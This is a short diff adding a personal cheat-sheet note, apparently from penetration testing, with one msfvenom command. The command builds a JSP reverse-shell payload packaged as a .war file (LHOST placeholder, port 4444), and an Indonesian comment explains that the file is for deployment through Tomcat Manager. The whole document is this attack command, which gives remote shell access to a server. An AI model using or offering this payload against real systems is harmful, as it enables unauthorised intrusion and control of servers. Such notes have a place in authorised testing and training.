@@ -1,0 +1,3 @@
+# msfvenom
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
+(membuat file .war yg sudah di revershell – tomcat manager)
